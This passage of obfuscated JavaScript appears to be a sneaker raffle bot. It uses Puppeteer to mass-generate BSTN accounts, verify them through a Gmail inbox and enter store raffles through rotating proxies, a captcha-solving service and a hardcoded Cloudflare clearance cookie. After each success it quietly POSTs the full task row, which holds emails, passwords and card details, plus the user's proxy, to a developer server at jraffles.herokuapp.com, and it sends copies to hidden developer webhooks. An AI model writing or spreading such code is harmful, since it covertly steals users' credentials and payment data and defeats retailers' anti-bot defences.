                                        if (_0x2fa1c8['Province'] == _0x537f4b[_0x436379]['State']) {
                                            await _0x510896['select']('#checkout_shipping_address_province', _0x2fa1c8['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x510896['select']('#checkout_shipping_address_province', _0x537f4b[_0x436379]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4fda60(0x190), _0x510896['evaluate'](() => {
                            const _0x5c5a93 = document['querySelector']('#continue_button');
                            for (var _0x508463 = 0x0; _0x508463 < 0x5; _0x508463++) {
                                if (_0x5c5a93) {
                                    _0x5c5a93['click'](), _0x5c5a93['click']();
                                    break;
                                } else
                                    _0x4fda60(0xfa0);
                            }
                        }), await _0x510896['waitForTimeout'](0x9c4);
                        try {
                            await _0x510896['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x510896['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x5e905f => _0x5e905f['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x510896['waitForTimeout'](0x7d0), console['log'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x510896['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4fda60(0x3e8), await _0x510896['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x114f4b => _0x114f4b['submit']()), await _0x4fda60(0x3e8);
                        try {
                            await _0x510896['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x510896['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x15660d => _0x15660d['submit']());
                        try {
                            await _0x510896['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1aef9f = 'no', _0x8bf342(_0x537f4b[_0x436379], _0x3daec2), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '')
                                try {
                                    await _0xb6cfae(_0x255a87['webhook'], _0x594b35['succesDEVMSG']);
                                } catch {
                                }
                            await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x594b35['succesDEVMSG']), await _0x4fda60(0xc8);
                            try {
                                await _0xb6cfae(_0x5d80c9, _0x594b35['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x26c985['replace']('#', ''),
                                    'module': _0x3daec2['name'],
                                    'entrydata': JSON['stringify'](_0x30b838),
                                    'proxy': '' + _0x519604[_0x436379]
                                };
                                var _0x53f260 = JSON['stringify'](prxdata);
                                let _0x2a2336 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x53f260, _0x2a2336);
                            } catch (_0x414d44) {
                            }
                        } catch (_0x493b7e) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x34ade4) {
                        _0x34ade4['message']['includes']('selector') && (_0x34ade4 = 'Connection\x20Error');
                        console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20' + _0x34ade4)), _0x21debb = '' + _0x34ade4;
                        var _0x4bc3c0 = await _0x1523c9(_0x537f4b[_0x436379], _0x3daec2, 'dev', !![], _0x21debb);
                        _0x594b35['errorDEV'] = { 'embeds': [_0x4bc3c0] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x594b35['errorDEV']), await _0xb6cfae(_0x991bd5, _0x594b35['errorDEV']), _0x1aef9f = 'yes';
                    } finally {
                        _0xf7800c && _0xf7800c['close']();
                        if (_0x1aef9f == 'yes' && _0x2206eb != 0x5 && _0x21debb != 'Size\x20Not\x20Found') {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x3daec2['name'] + ']\x20Task\x20' + (_0x436379 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2206eb + '\x20/\x205)')), _0x436379 = _0x436379 - 0x1, _0x2206eb = _0x2206eb + 0x1;
                            continue;
                        }
                        _0x1aef9f == 'yes' && _0x2206eb >= 0x5 && (_0x2540d5(_0x537f4b[_0x436379], _0x3daec2), _0x1aef9f = 'no', _0x2206eb = 0x0);
                        if (_0x436379 + 0x1 == _0x537f4b['length']) {
                            await _0x4fda60(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x255a87['AfewDelay'] + '\x20ms'), await _0x4fda60(_0x255a87['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x171118, _0x52afb1, _0x28d59b) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x147d24['writeFileSync']('proxies.txt', '');
                for (proxy in _0x28d59b) {
                    _0x147d24['appendFileSync']('proxies.txt', _0x28d59b[proxy] + '\x0a');
                }
                for (var _0x47a74b = 0x0; _0x47a74b < _0x52afb1['length']; _0x47a74b++) {
                    await _0x436f00(_0x52afb1, _0x47a74b), _0x147d24['appendFileSync']('tasks.csv', '\x0a' + _0x52afb1[_0x47a74b]['Url'] + ',' + _0x52afb1[_0x47a74b]['Size'] + ',' + _0x52afb1[_0x47a74b]['Email'] + ',' + _0x52afb1[_0x47a74b]['Password'] + ',' + _0x52afb1[_0x47a74b]['FirstName'] + ',' + _0x52afb1[_0x47a74b]['LastName'] + ',' + _0x52afb1[_0x47a74b]['Address1'] + ',' + _0x52afb1[_0x47a74b]['Address2'] + ',' + _0x52afb1[_0x47a74b]['HouseNumber'] + ',' + _0x52afb1[_0x47a74b]['Zip'] + ',' + _0x52afb1[_0x47a74b]['City'] + ',' + _0x52afb1[_0x47a74b]['Country'] + ',' + _0x52afb1[_0x47a74b]['State'] + ',' + _0x52afb1[_0x47a74b]['CardNumber'] + ',' + _0x52afb1[_0x47a74b]['ExpiryDate'] + ',' + _0x52afb1[_0x47a74b]['CVV'] + ',' + _0x52afb1[_0x47a74b]['NameOnCard'] + ',' + _0x52afb1[_0x47a74b]['Phone'] + ',' + _0x52afb1[_0x47a74b]['Follower']);
                }
                let _0x176179 = {
                    'username': _0x26c985,
                    'delay': _0x255a87['delay'],
                    'version': _0x1ad228,
                    'webhook': _0x255a87['webhook']
                };
                const _0x9096b6 = JSON['stringify'](_0x176179)['replace'](/"/g, '\x5c\x22');
                await _0x4fda60(0x3e8), _0x397b4a('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x9096b6
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x56bec6, _0xc2f2fe, _0x2fabec) {
                    var _0x206e7a = _0xc2f2fe, _0x55d02e = 0x0;
                    for (var _0x13fc6b = 0x0; _0x13fc6b < _0xc2f2fe['length']; _0x13fc6b++) {
                        maxTasks = Number(_0x255a87['threads']);
                        while (_0x55d02e >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        async function _0x193dfe(_0xb109b5, _0x52ca42, _0x400d75, _0x382be0, _0x2cbb61) {
                            _0x55d02e++, _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x255a87['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x162a54;
                            try {
                                await _0x436f00(_0x52ca42, _0x382be0);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0xf5e41e(_0xb109b5['name'] + '\x20Task\x20' + (_0x382be0 + 0x1) + '\x20/\x20' + _0x52ca42['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                            var _0x2cf6b8 = await _0x1523c9(_0x52ca42[_0x382be0], _0xb109b5, 'acc', ![]);
                            const _0x3ea2fb = { 'succesDEVMSG': { 'embeds': [_0x2cf6b8] } }, _0x240ff8 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x10ba2a = Math['round'](Math['random']() * (_0x400d75['length'] - 0x1)), _0x36c3e7 = _0x400d75[_0x10ba2a]['split'](':'), _0x39a538;
                            try {
                                _0x39a538 = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x36c3e7[0x0] + ':' + _0x36c3e7[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x39a538 = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x36c3e7[0x0] + ':' + _0x36c3e7[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x5abead = await _0x39a538['newPage']();
                                await _0x5abead['authenticate']({
                                    'username': '' + _0x36c3e7[0x2],
                                    'password': '' + _0x36c3e7[0x3]
                                }), console['log'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5abead['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5abead['setRequestInterception'](!![]), _0x5abead['on']('request', _0xf12860 => {
                                    _0xf12860['resourceType']() === 'image' ? _0xf12860['abort']() : _0xf12860['continue']();
                                });
                                try {
                                    await _0x5abead['goto']('' + _0x240ff8), await _0x5abead['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x5abead['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4fda60(0x7d0), console['log'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4fda60(0x190), await _0x5abead['waitForSelector']('#firstname'), await _0x5abead['focus']('#firstname'), await _0x5abead['keyboard']['down']('Control'), await _0x5abead['keyboard']['press']('A'), await _0x4fda60(0xc8), await _0x5abead['keyboard']['up']('Control'), await _0x5abead['keyboard']['press']('Backspace'), await _0x5abead['type']('#firstname', _0x52ca42[_0x382be0]['FirstName'], { 'delay': 0xf0 }), await _0x4fda60(0x190), await _0x5abead['focus']('#lastname'), await _0x5abead['keyboard']['down']('Control'), await _0x5abead['keyboard']['press']('A'), await _0x4fda60(0xc8), await _0x5abead['keyboard']['up']('Control'), await _0x5abead['keyboard']['press']('Backspace'), await _0x5abead['type']('#lastname', _0x52ca42[_0x382be0]['LastName'], { 'delay': 0xe6 }), await _0x4fda60(0x190), await _0x5abead['focus']('#email_address'), await _0x5abead['keyboard']['down']('Control'), await _0x5abead['keyboard']['press']('A'), await _0x4fda60(0xc8), await _0x5abead['keyboard']['up']('Control'), await _0x5abead['keyboard']['press']('Backspace'), await _0x5abead['type']('#email_address', _0x52ca42[_0x382be0]['Email'], { 'delay': 0x122 }), await _0x4fda60(0x190), await _0x5abead['type']('#password', _0x52ca42[_0x382be0]['Password'], { 'delay': 0x82 }), await _0x4fda60(0x1f4), await _0x5abead['type']('#password-confirmation', _0x52ca42[_0x382be0]['Password'], { 'delay': 0x7c }), console['log'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4fda60(0x2bc), await _0x5abead['$eval']('#form-validate', _0x544ad1 => _0x544ad1['submit']()), await _0x4fda60(0x1388);
                                const _0x52c0b = await _0x5abead['$']('#email_address-error');
                                if (_0x52c0b)
                                    throw new Error('Invalid\x20Email');
                                const _0x552369 = await _0x5abead['$']('#password-error');
                                if (_0x552369)
                                    throw new Error('Invalid\x20Password');
                                await _0x5abead['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Account\x20' + _0x52ca42[_0x382be0]['Email'] + '\x20Generated')), _0x147d24['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x52ca42[_0x382be0]['Email'] + ',' + _0x52ca42[_0x382be0]['Password']);
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x3ea2fb['succesDEVMSG']);
                                } catch {
                                }
                                await _0xb6cfae(_0xc2690c, _0x3ea2fb['succesDEVMSG']);
                                let _0x585adb = _0x52ca42[_0x382be0];
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'module': _0xb109b5['name'],
                                        'entrydata': JSON['stringify'](_0x585adb),
                                        'proxy': '' + _0x400d75[_0x382be0]
                                    };
                                    var _0x58dc0e = JSON['stringify'](prxdata);
                                    let _0x1b2d7e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x58dc0e, _0x1b2d7e);
                                } catch (_0x26cc6b) {
                                }
                                console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x5738a8) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20' + _0x5738a8)), _0x162a54 = '' + _0x5738a8;
                                var _0x597dc5 = await _0x1523c9(_0x52ca42[_0x382be0], _0xb109b5, 'acc', !![], _0x162a54);
                                _0x3ea2fb['errorDEV'] = { 'embeds': [_0x597dc5] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x3ea2fb['errorDEV']), await _0xb6cfae(_0x991bd5, _0x3ea2fb['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x39a538)
                                    _0x39a538['close']();
                                if (retry == 'yes' && _0x2cbb61 < 0x5)
                                    return console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Task\x20' + (_0x382be0 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x2cbb61 + 0x1) + '\x20/\x205)')), _0x55d02e--, _0x2cbb61 = _0x2cbb61 + 0x1, _0x193dfe(_0xb109b5, _0x52ca42, _0x400d75, _0x382be0, _0x2cbb61);
                                retry == 'yes' && _0x2cbb61 >= 0x5 && (_0x2540d5(_0x52ca42[_0x382be0], _0xb109b5), retry = 'no', _0x2cbb61 = 0x0), _0x55d02e--, console['log'](_0x46dcc5() + '\x20[' + _0xb109b5['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                            }
                        }
                        _0x193dfe(_0x56bec6, _0x206e7a, _0x2fabec, _0x13fc6b, 0x0), await _0x4fda60(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x50cc1f, _0x43e83d) {
                    var _0x3fff54 = ![], _0x537dac = [], _0x4a450d = 0x0;
                    async function _0x317d31() {
                        var _0x390c31 = new _0x4ce16c({
                            'user': _0x255a87['masterMail'],
                            'password': _0x255a87['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1e3008(_0x53520f) {
                            _0x390c31['openBox']('INBOX', ![], _0x53520f);
                        }
                        _0x390c31['once']('ready', function () {
                            _0x1e3008(function (_0x1ced61, _0x356083) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1ced61)
                                    throw _0x1ced61;
                                _0x390c31['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x37f154, _0x5a929e) {
                                    if (!_0x5a929e || !_0x5a929e['length'])
                                        console['log'](_0x46dcc5() + '\x20[' + _0x50cc1f['name'] + ']\x20No\x20mails\x20found'), _0x390c31['end']();
                                    else {
                                        var _0x365aa5 = _0x390c31['seq']['fetch'](_0x5a929e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x365aa5['on']('message', function (_0x135f84, _0x3556ae) {
                                            var _0x12f9b4 = '(#' + _0x3556ae + ')\x20';
                                            _0x135f84['on']('body', function (_0x385dcc, _0x267bab) {
                                                _0x425966(_0x385dcc, (_0x23c048, _0x49e1a3) => {
                                                    var _0x2153dc = _0x49e1a3['text']['split']('customer/account/confirm/')[0x1], _0xf40eba = _0x2153dc['split'](']')[0x0], _0x2fe733 = _0xf40eba['split']('>')[0x0];
                                                    _0x537dac['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x2fe733);
                                                });
                                            }), _0x135f84['once']('end', function () {
                                            });
                                        }), _0x365aa5['once']('error', function (_0x4b95c3) {
                                            console['log']('Fetch\x20error:\x20' + _0x4b95c3), _0x3fff54 = !![];
                                        }), _0x365aa5['once']('end', function () {
                                            _0x390c31['end'](), _0x3fff54 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x390c31['once']('error', function (_0x40f1d1) {
                            console['log'](_0x3e3bb6['red'](_0x40f1d1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3fff54 = !![];
                        }), _0x390c31['once']('end', async function () {
                            _0x3fff54 = !![];
                        }), _0x390c31['connect']();
                    }
                    try {
                        _0x317d31();
                        while (!_0x3fff54) {
                            await _0x4fda60(0xfa0);
                        }
                        console['log']('Found\x20' + _0x537dac['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4fda60(0x7d0);
                    }
                    for (var _0x275d71 = 0x0; _0x275d71 < _0x537dac['length']; _0x275d71++) {
                        maxTasks = Number(_0x255a87['threads']);
                        while (_0x4a450d >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        async function _0xe2968e(_0x330fb4, _0x552ea4, _0x5310b8, _0x25ce22, _0x189e62) {
                            _0x4a450d++, _0x510708['use'](_0x4fd89e());
                            if (_0x2cf090 != 'yes')
                                var _0x2cf090 = '', _0x189e62 = 0x0;
                            var _0x50e5d6 = Math['round'](Math['random']() * (_0x5310b8['length'] - 0x1)), _0x73b8d6 = _0x5310b8[_0x50e5d6]['split'](':'), _0x3cc8df;
                            try {
                                _0x3cc8df = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x73b8d6[0x0] + ':' + _0x73b8d6[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3cc8df = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x73b8d6[0x0] + ':' + _0x73b8d6[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0xea99d0 = await _0x3cc8df['newPage']();
                                await _0xea99d0['authenticate']({
                                    'username': '' + _0x73b8d6[0x2],
                                    'password': '' + _0x73b8d6[0x3]
                                }), console['log'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0xea99d0['setRequestInterception'](!![]), _0xea99d0['on']('request', _0x3fb660 => {
                                    _0x3fb660['resourceType']() === 'image' ? _0x3fb660['abort']() : _0x3fb660['continue']();
                                }), console['log'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0xea99d0['goto'](_0x552ea4[_0x25ce22]);
                                } catch (_0xb0aa4d) {
                                    _0x2cf090 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0xb0aa4d);
                                }
                                console['log'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xea99d0['waitForTimeout'](0xbb8);
                                try {
                                    await _0xea99d0['waitForSelector']('.account-nav'), _0x2cf090 = 'no', console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0xe892ff = await _0x1523c9(null, _0x330fb4, 'ver', ![]);
                                    const _0x1501ac = { 'succesDEVMSG': { 'embeds': [_0xe892ff] } };
                                    await _0xb6cfae(_0x4a8a26, _0x1501ac['succesDEVMSG']);
                                } catch {
                                    _0x2cf090 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x2ef947) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20' + _0x2ef947));
                                var _0x568f6e = _0x2ef947, _0x52b93d = await _0x1523c9(null, _0x330fb4, 'ver', !![], _0x568f6e);
                                const _0xff35f5 = { 'errorDEVMSG': { 'embeds': [_0x52b93d] } };
                                _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0xff35f5['errorDEVMSG']), await _0xb6cfae(_0x991bd5, _0xff35f5['errorDEVMSG']);
                            } finally {
                                if (_0x3cc8df)
                                    _0x3cc8df['close']();
                                if (_0x2cf090 == 'yes' && _0x189e62 != 0x5)
                                    return console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Task\x20' + (_0x25ce22 + 0x1) + '\x20:\x20Retrying\x20(' + _0x189e62 + '\x20/\x205)')), _0x4a450d--, _0x189e62 = _0x189e62 + 0x1, _0xe2968e(_0x330fb4, _0x552ea4, _0x5310b8, _0x25ce22, _0x189e62);
                                _0x2cf090 == 'yes' && _0x189e62 >= 0x5 && (_0x2cf090 = 'no', _0x189e62 = 0x0), _0x4a450d--, console['log'](_0x46dcc5() + '\x20[' + _0x330fb4['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                            }
                        }
                        if (_0x275d71 == _0x537dac['length'] - 0x1) {
                            await _0xe2968e(_0x50cc1f, _0x537dac, _0x43e83d, _0x275d71, 0x0);
                            return;
                        }
                        _0xe2968e(_0x50cc1f, _0x537dac, _0x43e83d, _0x275d71, 0x0), await _0x4fda60(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x564ab1, _0x5ab73e, _0x55707e) {
                    var _0x361091 = 0x0, _0x2add80 = _0x5ab73e;
                    for (var _0x46925d = 0x0; _0x46925d < _0x5ab73e['length']; _0x46925d++) {
                        maxTasks = Number(_0x255a87['threads']);
                        while (_0x361091 >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        let _0xd6c541 = ![];
                        async function _0x483c53(_0x1ef997, _0x4774d3, _0x2077fa, _0x36ef76, _0x2340c5) {
                            _0x361091++, _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x255a87['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x33f32f, _0x22f469 = _0x4774d3[_0x36ef76];
                            try {
                                await _0x436f00(_0x4774d3, _0x36ef76);
                            } catch {
                                _0x349800 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x39d62d(_0x579195) {
                                const _0x39af16 = _0x147d24['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5304b5 = _0x22245b['parse'](_0x39af16, { 'header': !![] })['data'];
                                let _0xbe8cc8 = ![];
                                for (var _0x10dda7 of _0x5304b5) {
                                    if (_0x10dda7['Url'] == _0x579195['Url'] && _0x10dda7['Email'] == _0x579195['Email']) {
                                        _0xbe8cc8 = !![];
                                        break;
                                    }
                                }
                                return _0xbe8cc8;
                            }
                            _0xf5e41e(_0x1ef997['name'] + '\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20/\x20' + _0x4774d3['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                            var _0x4807a8 = Math['round'](Math['random']() * (_0x2077fa['length'] - 0x1)), _0x4d593b = _0x2077fa[_0x4807a8]['split'](':'), _0x23c63f;
                            let _0x3f3eb1 = ![], _0x349800 = 'no';
                            try {
                                if (await _0x39d62d(_0x4774d3[_0x36ef76]) == !![]) {
                                    console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3f3eb1 = !![], _0xd6c541 = !![];
                                    return;
                                }
                                try {
                                    _0x23c63f = await _0x510708['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4d593b[0x0] + ':' + _0x4d593b[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x23c63f = await _0x510708['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4d593b[0x0] + ':' + _0x4d593b[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x5b91f9 = await _0x23c63f['newPage'](), _0x496747 = await _0x5b91f9['target']()['createCDPSession'](), { windowId: _0x3a19c7 } = await _0x496747['send']('Browser.getWindowForTarget');
                                await _0x5b91f9['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x31e824 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x5b91f9['authenticate']({
                                    'username': '' + _0x4d593b[0x2],
                                    'password': '' + _0x4d593b[0x3]
                                }), console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b91f9['goto']('' + _0x4774d3[_0x36ef76]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4fda60(0x1388);
                                var _0x5d65c9 = await _0x5b91f9['$']('#turnstile-wrapper');
                                if (_0x5d65c9) {
